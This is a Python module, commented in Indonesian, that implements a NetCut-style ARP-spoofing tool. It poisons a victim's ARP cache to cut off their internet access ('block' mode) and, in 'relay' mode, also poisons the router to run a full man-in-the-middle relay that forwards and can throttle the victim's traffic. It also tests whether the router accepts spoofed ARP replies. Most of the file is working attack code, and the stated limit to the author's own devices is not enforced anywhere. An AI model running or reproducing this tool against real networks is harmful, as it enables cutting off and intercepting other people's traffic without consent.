"""ARP spoofing / traffic redirection - padanan CNetCutSpoofer.

Kenapa modul ini perlu ada
---------------------------
Aturan nftables di laptop hanya berlaku untuk trafik yang *dimiliki* laptop
itu sendiri (chain input/output). Trafik internet milik perangkat lain di LAN
tidak pernah melewati laptop karena WiFi bekerja sebagai switch dan router
yang melakukan forwarding. Karena itu `nft ... drop` tidak pernah menyentuh
trafik HP lain.

NetCut Windows menyelesaikan ini dengan ARP spoofing (class CNetCutSpoofer
+ aips.exe "Arp Intelligent Protection Service"): korban diberi tahu bahwa
MAC gateway adalah MAC laptop kita, sehingga trafik korban ikut dialihkan ke
laptop dan bisa di-drop atau di-policing.

Modul ini mengimplementasikan hal yang sama dengan Scapy:

  - victim_only : korban believes gateway is at our MAC  -> block
  - victim+gw   : gateway believes victim is at our MAC  -> full MITM relay

Target dari modul ini adalah perangkat milik sendiri pada jaringan sendiri.
"""

from __future__ import annotations

import socket
import struct
import subprocess
import threading
import time

try:
    from scapy.all import ARP, Ether, sendp
except ImportError:
    ARP = Ether = sendp = None

ETH_P_ALL = 0x0003
ETH_P_IP = 0x0800


def _iface_mac(iface: str) -> str:
    try:
        with open(f"/sys/class/net/{iface}/address") as fh:
            return fh.read().strip()
    except OSError:
        return ""


def _default_gateway() -> str:
    try:
        out = subprocess.run(["ip", "route", "show", "default"],
                             capture_output=True, text=True, timeout=5).stdout
        for line in out.splitlines():
            parts = line.split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except (OSError, subprocess.SubprocessError, IndexError):
        pass
    return ""


def _arp_resolve(ip: str, iface: str, timeout: float = 2.0) -> str:
    """Cari MAC lewat ARP request (butuh CAP_NET_RAW).

    srp()sometimes gagal di container/VM karena interface default-nya salah,
    jadi fallback ke socket AF_PACKET raw secara manual.
    """
    try:
        from scapy.all import srp
    except ImportError:
        return ""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=timeout, verbose=0, iface=iface)
        for _, r in ans:
            if r[ARP].psrc == ip:
                return r[ARP].hwsrc
    except Exception:
        pass
    return _arp_resolve_raw(ip, iface, timeout)


def _arp_resolve_raw(ip: str, iface: str, timeout: float = 2.0) -> str:
    """Fallback ARP resolve memakai AF_PACKET raw socket."""
    if ARP is None:
        return ""
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    except OSError:
        return ""
    try:
        sock.bind((iface, 0))
        sock.settimeout(0.5)
        target = socket.inet_aton(ip)
        req = (Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)).build()
        for _ in range(4):
            try:
                sock.send(req)
            except OSError:
                return ""
            end = time.time() + timeout
            while time.time() < end:
                try:
                    frame = sock.recv(65535)
                except (socket.timeout, OSError):
                    break
                if len(frame) < 42:
                    continue
                if struct.unpack("!H", frame[12:14])[0] != 0x0806:
                    continue
                arp = frame[14:]
                if struct.unpack("!H", arp[6:8])[0] != 2:  # reply
                    continue
                if arp[14:18] != target:
                    continue
                return ":".join(f"{b:02x}" for b in arp[8:14])
    finally:
        try:
            sock.close()
        except OSError:
            pass
    return ""


def _neigh_lookup(ip: str, iface: str) -> str:
    """Ambil MAC dari cache ARP kernel (ip neigh)."""
    try:
        out = subprocess.run(["ip", "neigh", "show", ip, "dev", iface],
                             capture_output=True, text=True, timeout=5).stdout
    except (OSError, subprocess.SubprocessError):
        return ""
    for line in out.splitlines():
        parts = line.split()
        if "lladdr" in parts:
            try:
                mac = parts[parts.index("lladdr") + 1]
            except IndexError:
                continue
            if mac not in {"00:00:00:00:00:00", "incomplete"}:
                return mac
    return ""


def _ip_checksum(data: bytes) -> bytes:
    """Checksum header IP (RFC 1071)."""
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return struct.pack("!H", (~total) & 0xFFFF)


class ArpSpoofer:
    """Kelola target ARP spoofing aktif.

    mode per target:
      "block" - korban believes gateway is at our MAC; trafik masuk ke kita
                lalu di-drop oleh nftables (tidak diteruskan).
      "relay" - programming relay: trafik korban diteruskan ke gateway asli
                sehingga koneksi tetap hidup namun bisa di-rate-limit.
    """

    def __init__(self, iface: str):
        self.iface = iface
        self.our_mac = _iface_mac(iface)
        self.gateway_ip = _default_gateway()
        self.gateway_mac = ""
        self.targets: dict[str, dict] = {}
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._relay_sock: socket.socket | None = None
        self._tx_sock: socket.socket | None = None

    # -- setup --------------------------------------------------------
    def reset_for_network_change(self) -> None:
        """Reset setelah pindah WiFi.

        Gateway yang lama sudah tidak relevan, dan target ARP spoof
        sebelumnya menunjuk ke subnet yang sudah ditinggalkan. ARP cache
        korban juga perlu dikembalikan dulu supaya tidak terkunci ke
        MAC kita.
        """
        # kembalikan ARP cache korban dulu (jika masih ada)
        victims = list(self.targets)
        if victims:
            print(f"[spoof] kembalikan ARP cache {victims}", flush=True)
        self.restore_all()
        self.targets.clear()
        self.gateway_ip = _default_gateway()
        self.gateway_mac = ""
        # tutup socket lama supaya tidak bocor
        for sock in (self._tx_sock, self._relay_sock):
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass
        self._tx_sock = None
        self._relay_sock = None

    def refresh_gateway(self) -> str:
        if self.gateway_ip and not self.gateway_mac:
            self.gateway_mac = _arp_resolve(self.gateway_ip, self.iface)
        return self.gateway_mac

    # -- poisoning ----------------------------------------------------
    def _send(self, dst_mac: str, psrc: str, hwsrc: str, pdst: str) -> None:
        if sendp is None:
            return
        try:
            pkt = Ether(src=hwsrc, dst=dst_mac) / ARP(
                op=2, psrc=psrc, pdst=pdst, hwsrc=hwsrc, hwdst=dst_mac
            )
            sendp(pkt, iface=self.iface, verbose=0)
        except Exception:
            pass

    def poison(self, victim_ip: str, victim_mac: str = "", mode: str = "block") -> bool:
        """Mulai ARP spoofing terhadap satu victim.

        mode "block": trafik korban dialihkan ke laptop lalu di-drop.
        mode "relay": trafik korban dialihkan ke laptop lalu diteruskan ke
                      gateway asli (sehingga korban tetap online, hanya
                      bisa di-rate-limit).
        """
        if not self.our_mac:
            return False
        self.refresh_gateway()
        if not victim_mac:
            victim_mac = _arp_resolve(victim_ip, self.iface)
        if not victim_mac:
            # fallback: cache ARP kernel (ip neigh)
            victim_mac = _neigh_lookup(victim_ip, self.iface)
        if not victim_mac:
            return False
        with self._lock:
            self.targets[victim_ip] = {
                "ip": victim_ip,
                "mac": victim_mac,
                "mode": mode,
                "since": time.time(),
            }
        # kirim langsung supaya korban cepat forget gateway asli
        self._send(victim_mac, self.gateway_ip, self.our_mac, victim_ip)
        return True

    def set_mode(self, victim_ip: str, mode: str) -> bool:
        """Ubah mode target (block <-> relay) tanpa mengulang spoof."""
        with self._lock:
            info = self.targets.get(victim_ip)
            if not info:
                return False
            info["mode"] = mode
        return True

    def restore(self, victim_ip: str) -> bool:
        """Kembalikan cache ARP korban ke gateway asli.

        ARP reply biasa TIDAK cukup: kernel korban hanya memakai ARP reply
        sebagai jawaban atas request-nya sendiri (state machine RFC 826),
        bukan untuk memperbarui entri cache secara proaktif.

        Yang bekerja adalah gratuitous ARP reply - broadcast yang memberi
        tahu seluruh jaringan bahwa gateway ada di MAC aslinya. Kernel
        korban akan memperbarui cache-nya karena address resolution
        menerima update dari frame broadcast.
        """
        with self._lock:
            info = self.targets.pop(victim_ip, None)
        if not info:
            return False
        self.refresh_gateway()
        if not self.gateway_mac:
            return False
        # gratuitous ARP reply: broadcast, ethernet src = MAC gateway asli
        self._send_broadcast(self.gateway_ip, self.gateway_mac)
        # dan kirim langsung ke korban sebagai belt-and-braces
        self._send(info["mac"], self.gateway_ip, self.gateway_mac, victim_ip)
        return True

    def _send_broadcast(self, psrc: str, hwsrc: str) -> None:
        """Kirim gratuitous ARP reply (dst = broadcast)."""
        if sendp is None:
            return
        try:
            pkt = Ether(src=hwsrc, dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2, psrc=psrc, pdst=psrc, hwsrc=hwsrc, hwdst="00:00:00:00:00:00"
            )
            sendp(pkt, iface=self.iface, verbose=0)
        except Exception:
            pass

    def restore_all(self) -> None:
        for ip in list(self.targets):
            self.restore(ip)

    # -- background refresh + relay -----------------------------------
    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()
        if self._relay_sock:
            try:
                self._relay_sock.close()
            except OSError:
                pass
            self._relay_sock = None
        self.restore_all()

    def _loop(self) -> None:
        while not self._stop.is_set():
            try:
                self.refresh_gateway()
                with self._lock:
                    targets = list(self.targets.items())
                relay_active = False
                for victim_ip, info in targets:
                    if info["mode"] == "relay":
                        relay_active = True
                        # Dua sisi: korban believe gateway = MAC kita, dan
                        # router believe IP korban = MAC kita. Tanpa yang
                        # kedua, balasan internet tidak pernah sampai ke korban.
                        self._send(info["mac"], self.gateway_ip, self.our_mac, victim_ip)
                        self._send(self.gateway_mac, victim_ip, self.our_mac, victim_ip)
                        continue
                    # mode block: victim's traffic comes to us and gets
                    # dropped by nftables. Re-assert the spoof periodically
                    # so the victim's ARP cache keeps pointing at us.
                    self._send(info["mac"], self.gateway_ip, self.our_mac, victim_ip)
                if relay_active:
                    # relay terus-menerus selama ada target mode relay
                    self._relay_once(timeout=1.0)
                else:
                    time.sleep(2.0)
            except Exception:
                time.sleep(1.0)

    def _send_raw(self, frame: bytes, dst_mac: str) -> bool:
        """Kirim frame ethernet raw ke dst_mac.

        AF_PACKET tidak menerima MAC sebagai string pada sendto()
        ("No such device"). Address tuple yang valid adalah 5-elemen:
        (ifname, proto, pkttype, hatype, addr) dengan addr = MAC tujuan
        sebagai bytes.
        """
        try:
            if self._tx_sock is None:
                self._tx_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                              socket.htons(ETH_P_IP))
                self._tx_sock.bind((self.iface, 0))
            addr = bytes.fromhex(dst_mac.replace(":", ""))
            self._tx_sock.sendto(frame, (self.iface, ETH_P_IP, 0, 1, addr))
            return True
        except OSError:
            return False

    def _relay_once(self, timeout: float = 0.5) -> None:
        """Relay dua arah antara korban dan gateway asli.

        Dua arah wajib, kalau tidak korban tidak akan pernah menerima
        balasan dari internet:
          korban -> gateway : frame masuk ke kita, TTL dikurangi, dikirim ke
                              gateway dengan src MAC = MAC gateway asli
                              (agar gateway membalas ke gateway, bukan ke kita)
          gateway -> korban : frame dari gateway untuk IP korban, dikirim
                              ke korban dengan dst MAC = MAC korban
        """
        if self._relay_sock is None:
            self._relay_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                             socket.htons(ETH_P_ALL))
            self._relay_sock.bind((self.iface, 0))
            self._relay_sock.settimeout(timeout)
        if not self.gateway_mac:
            return

        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                frame = self._relay_sock.recv(65535)
            except (socket.timeout, BlockingIOError):
                return
            except OSError:
                return
            if len(frame) < 34:
                continue
            if struct.unpack("!H", frame[12:14])[0] != ETH_P_IP:
                continue
            eth_dst = frame[0:6]
            eth_src = frame[6:12]
            ip = frame[14:]
            ihl = (ip[0] & 0x0F) * 4
            if ihl < 20 or len(ip) < ihl:
                continue
            src_ip = socket.inet_ntoa(ip[12:16])
            dst_ip = socket.inet_ntoa(ip[16:20])
            with self._lock:
                # Arah 1: src = IP korban. Arah 2: dst = IP korban.
                # Karena itu lookup harus considering KEDUA sisi, bukan
                # hanya src_ip.
                info = self.targets.get(src_ip) or self.targets.get(dst_ip)
            if not info or info["mode"] != "relay":
                continue
            victim_mac = bytes.fromhex(info["mac"].replace(":", ""))
            gw_mac = bytes.fromhex(self.gateway_mac.replace(":", ""))
            our_mac = bytes.fromhex(self.our_mac.replace(":", ""))

            # arah 1: korban -> internet
            # src MAC ethernet HARUS MAC kita sendiri: access point WiFi
            # membuang frame dengan source MAC asing, sehingga frame yang
            # eth src = MAC gateway tidak pernah sampai ke router.
            if src_ip == info["ip"] and eth_dst in (our_mac, gw_mac):
                if dst_ip == self.gateway_ip:
                    continue
                ttl = ip[8]
                if ttl <= 1:
                    continue
                new_ip = bytearray(ip)
                new_ip[8] = ttl - 1
                new_ip[10:12] = b"\x00\x00"
                # Checksum IP HANYA menutupi header (IHL byte), bukan payload.
                new_ip[10:12] = _ip_checksum(bytes(new_ip[:ihl]))
                new_frame = our_mac + gw_mac + b"\x08\x00" + bytes(new_ip)
                if not self._send_raw(new_frame, self.gateway_mac):
                    return
                continue

            # arah 2: gateway -> korban
            # Router harus believe bahwa IP korban berada di MAC kita,
            # supaya balasan internetnya dikirim ke kita dan bisa kita
            # teruskan ke korban. Itu dilakukan dengan menyuruh router
            # memperbarui entri ARP-nya (ARP reply dari IP korban).
            if dst_ip == info["ip"] and eth_dst in (our_mac, gw_mac):
                new_frame = our_mac + victim_mac + b"\x08\x00" + ip
                if not self._send_raw(new_frame, info["mac"]):
                    return
                # perbarui cache ARP router: IP korban -> MAC kita
                self._send(self.gateway_mac, info["ip"], self.our_mac, info["ip"])

    def router_spoofable(self, victim_ip: str, victim_mac: str) -> bool:
        """Cek apakah router menerima ARP spoof dari kita.

        Kalau router menolak (proteksi ARP spoofing aktif), balasan
        internet akan dikirim langsung ke korban, sehingga rate limit
        hanya berlaku untuk arah upload. Hasil: True = bisa, False = tidak.
        """
        if not self.gateway_mac or not victim_mac:
            return False
        # simpan state router sebelumnya (via ARP request ke korban)
        before = self._arp_probe(victim_ip)
        # kirim ARP reply palsu ke router: IP korban -> MAC kita
        self._send(self.gateway_mac, victim_ip, self.our_mac, victim_ip)
        time.sleep(0.5)
        after = self._arp_probe(victim_ip)
        if before and after:
            return after.lower() == self.our_mac.lower()
        return False

    def _arp_probe(self, ip: str) -> str:
        """Tanya siapa yang memiliki IP ini (dari sudut pandang Broadcast)."""
        try:
            from scapy.all import srp
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                         timeout=1.5, verbose=0, iface=self.iface)
        except Exception:
            return ""
        for _, r in ans:
            if r[ARP].psrc == ip:
                return r[ARP].hwsrc
        return ""

    # -- introspection -------------------------------------------------
    def status(self) -> list[dict]:
        with self._lock:
            return [
                {"ip": ip, "mac": i["mac"], "mode": i["mode"],
                 "since": round(time.time() - i["since"], 1)}
                for ip, i in self.targets.items()
            ]
